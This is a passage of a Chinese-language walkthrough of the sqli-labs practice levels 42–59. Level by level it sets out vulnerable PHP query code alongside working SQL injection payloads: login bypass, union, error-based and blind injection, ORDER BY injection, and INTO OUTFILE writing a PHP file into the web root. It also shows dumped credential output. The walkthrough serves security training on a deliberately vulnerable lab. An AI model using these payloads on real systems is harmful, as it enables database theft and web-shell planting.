    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">:</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这一题漏洞比较多，首先 login.php 中 password 没有过滤，可以进行常规的报错注入以及盲注，同时本身又支持堆叠查询，所以也支持堆叠注入。 pass_change.php update 语句存在漏洞，典型的二次注入，类似于 Less-24。</p>
<p>经典的<strong>万能密码</strong>绕过 <code>1&#39; or 1#</code>:</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>
...

login_user=admin&amp;login_password=1' or 1#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为登录成功后返回：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以登录了 id 为 1 的 Dumb 用户：</p>
<p><img src="https://image.3001.net/images/20200517/15897218466276.png" alt="img"></p>
<p>尝试<strong>联合查询</strong>:</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-42/login.php</span> <span class="token http-version property">HTTP/1.1</span></span>
...

login_user=admin&amp;login_password=1' union select 1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3#&amp;mysubmit=Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>报错注入</strong>：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login_user&#x3D;admin&amp;login_password&#x3D;1&#39; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;mysubmit&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同理这里也可以进行盲注和堆叠查注入， 这里不再赘述。</p>
<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>username=(&#39;$username&#39;)</code></td>
</tr>
</tbody></table>
<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p>
<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>username=&#39;$username&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>username=(&#39;$username&#39;)</code></td>
</tr>
</tbody></table>
<p>与 Less-43 闭合方式一致，只是这里少了报错注入的利用方法。</p>
<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>ORDER BY $id</code></td>
</tr>
</tbody></table>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># GET 方式获取 sort 参数</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 直接将 id 带入 SQL 中</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 查询成功：
    输出查询信息
<span class="token keyword">else</span>：
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>order by 不同于 where 后的注入点，不能使用 union 等进行注入。注入方式十分灵活，下面在本关来详细讲解一下。</p>
<h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul>
<li><strong>升序和降序验证</strong></li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 升序排序</span>
?sort<span class="token operator">=</span><span class="token number">1</span> asc

<span class="token comment"># 降序排序</span>
?sort<span class="token operator">=</span><span class="token number">1</span> dasc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><strong>rand() 验证</strong></li>
</ul>
<p>rand(ture) 和 rand(false) 的结果是不一样的</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(true)
?sort&#x3D;rand(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
<p>此外 rand() 结果是一直都是随机的</p>
<pre class="line-numbers language-none"><code class="language-none">?sort&#x3D;rand()
?sort&#x3D;1 and rand()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li><strong>延时验证</strong></li>
</ul>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;sleep(1)
?sort&#x3D;(sleep(1))
?sort&#x3D;1 and sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p>
<h3 id="报错注入1-2"><a href="#报错注入1-2" class="headerlink" title="报错注入1"></a>报错注入1</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="报错注入2-2"><a href="#报错注入2-2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>利用 procedure analyse 参数，也可以执行报错注入。</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,(SELECT+CONCAT_WS(&#39;:&#39;,username,password)+FROM+users limit 0,1))),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第 1 位为：s</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)
?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即`s</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))
?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p><strong>将查询结果导入到文件中</strong>：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?sort<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/less46.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
<p>访问验证是否有信息：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/less46.txt
<span class="token number">1</span>    Dumb    Dumb
<span class="token number">2</span>    Angelina    I-kill-you
<span class="token number">3</span>    Dummy    p@ssword
<span class="token number">4</span>    secure    crappy
<span class="token number">5</span>    stupid    stupidity
<span class="token number">6</span>    superman    genious
<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le
<span class="token number">8</span>    admin    admin
<span class="token number">9</span>    admin1    admin1
<span class="token number">10</span>    admin2    admin2
<span class="token number">11</span>    admin3    admin3
<span class="token number">12</span>    dhakkan    dumbo
<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>利用导出文件 getshell</strong>：</p>
<p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
<p>来查看下写入的文件内容是啥样子的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/www/html/less46.php 
<span class="token number">1</span>    Dumb    Dumb<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">2</span>    Angelina    I-kill-you<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">3</span>    Dummy    p@ssword<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">4</span>    secure    crappy<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">5</span>    stupid    stupidity<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">6</span>    superman    genious<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">8</span>    admin    admin<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">9</span>    admin1    admin<span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">10</span>    admin2    admin<span class="token operator"><span class="token file-descriptor important">2</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">11</span>    admin3    admin<span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">12</span>    dhakkan    dumbo<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token number">14</span>    admin4    admin<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>浏览器访问测试看看：</p>
<p><img src="https://image.3001.net/images/20200518/15897680165097.png" alt="img"></p>
<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p>
<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>ORDER BY $id</code></td>
</tr>
</tbody></table>
<p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里 不再过多演示了。</p>
<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注</td>
<td align="left"><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里 不再过多演示了。</p>
<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>ORDER BY $id</code></td>
</tr>
</tbody></table>
<p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话 这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p>
<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p>
<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>ORDER BY $id</code></td>
</tr>
</tbody></table>
<p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">布尔盲注、延时盲注、堆叠注入</td>
<td align="left"><code>ORDER BY &#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
<h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>简单源码分析：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> reset<span class="token punctuation">:</span>
    <span class="token comment"># 根据时间戳生成 cookie</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> cookie 中有 challenge<span class="token punctuation">:</span>
        <span class="token variable">$sessid</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># 生成 cookie </span>
        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">30</span><span class="token punctuation">;</span>
        <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$col</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"challenge"</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        计数器 <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM security.users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> 有查询成功<span class="token punctuation">:</span>
        输出查询信息
    <span class="token keyword">else</span>：
        啥都不输出

<span class="token comment"># key 被双重过滤了</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT 1 FROM <span class="token interpolation"><span class="token variable">$table</span></span> WHERE <span class="token interpolation"><span class="token variable">$col1</span></span>= '<span class="token interpolation"><span class="token variable">$key</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p>
<p><strong>判断闭合方式</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>判断字段数</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; order by 3--+
?id&#x3D;1&#39; order by 4--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>查询有可注入的字段</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字段数 2,3</p>
<p>查询表名**</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样</p>
<p><strong>查询列名</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;0x4b4d413045325a323956)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查到列名如下：id、sessid、secret_1XVB、tryy</p>
<p><strong>查询字段值</strong></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F</p>
<p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p>
<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=($id)</code></td>
</tr>
</tbody></table>
<p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化， 这里不再赘述。</p>
<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody></table>
<p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p>
<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$unames</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Dumb"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Angelina"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Dummy"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"secure"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"stupid"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"superman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"batman"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dhakkan"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"admin4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$unames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name : '</span><span class="token operator">.</span> <span class="token variable">$unames</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password : '</span> <span class="token operator">.</span><span class="token variable">$pass</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里 注入的表名为：WOO6ID239T，列名为：secret_OD68</p>
<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p>
